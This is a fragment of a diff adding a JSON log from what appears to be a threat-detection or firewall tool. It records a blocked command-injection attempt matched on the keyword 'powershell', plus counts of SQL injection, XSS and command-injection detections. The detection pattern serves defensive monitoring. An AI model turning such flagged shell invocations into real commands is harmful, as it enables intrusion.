+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "command_injection",
+            "confidence": 0.85,
+            "patterns": [
+              "powershell"
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 85
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T02:03:44.558066+00:00"
+    }
+  ],
+  "stats": {
+    "requests": 573,
+    "threats": 181,
+    "blocked": 181,
+    "users_online": 0,
+    "sql_injection": 84,
+    "xss": 87,
+    "command_injection": 10,
+    "high_severity": 4,
+    "medium_severity": 0,
+    "low_severity": 0
+  },
+  "system_info": {
+    "start_time": "2025-11-07T01:47:11.069827+00:00",
+    "version": "4.0.0",
+    "platform": "Windows"
+  }
+}
